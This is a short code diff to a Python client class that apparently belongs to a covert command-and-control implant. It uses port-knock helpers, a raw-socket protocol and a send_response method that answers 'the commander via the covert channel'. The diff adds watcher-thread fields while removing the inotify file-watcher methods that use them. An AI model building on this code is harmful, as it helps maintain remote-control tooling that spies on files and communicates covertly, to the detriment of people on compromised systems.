@@ -54,6 +54,8 @@ class Client:
         self.lock            = threading.Lock()
         self.running         = True
         self.protocol        = RawSocketProtocol()
+        self._watcher_thread = None  # active watcher thread
+        self._watcher_stop = threading.Event()  # set to stop the watcher
 
     # ------------------------------------------------------------------ #
     #  Port-knock helpers                                                  #
@@ -395,29 +397,6 @@ class Client:
                 print(f"    Error: {e}")
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
-    def _run_watcher(self, watcher):
-        """Thread target: drive inotify and check stop flag each iteration."""
-        import inotify.adapters
-        try:
-            i = inotify.adapters.InotifyTree(watcher.path, mask=watcher.event_mask)
-            for event in i.event_gen(yield_nones=True):
-                if self._watcher_stop.is_set():
-                    print("[*] File watcher stopped.")
-                    break
-                if event is None:
-                    continue
-                _, type_names, watch_path, filename = event
-                watcher._handle(type_names, watch_path, filename)
-        except Exception as e:
-            print(f"[!] Watcher thread error: {e}")
-
-    def _stop_file_watcher(self):
-        """Stop the active watcher thread if one is running."""
-        if self._watcher_thread and self._watcher_thread.is_alive():
-            self._watcher_stop.set()
-            self._watcher_thread.join(timeout=3)
-        self._watcher_thread = None
-        self._watcher_stop.clear()
 
     def send_response(self, dst_ip, command_type, payload):
         """Send a response back to the commander via the covert channel."""
